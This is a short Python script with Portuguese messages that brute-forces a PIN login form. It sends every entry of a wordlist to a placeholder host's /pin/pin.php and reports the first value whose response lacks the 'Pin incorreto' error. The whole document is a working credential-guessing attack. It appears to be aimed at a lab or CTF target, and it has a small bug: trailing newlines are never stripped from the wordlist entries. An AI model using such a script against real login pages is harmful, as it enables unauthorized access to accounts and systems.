import requests
url = "http://X.X.X.X/"
login_url = url+"/pin/pin.php"
arquivo = "wordlist.txt"
def request(user):
    data = {"nome": user}
    r = requests.post(login_url, data=data)
    if "Pin incorreto" in r.text:
        print("Nao foi possivel achar a senha :x")
    else:
        print("A senha é =D : "+user + "")
wordlist = open(arquivo, "r")
for i in wordlist:
 print("Testando "+" || " + i)
 request(i)
 print("")
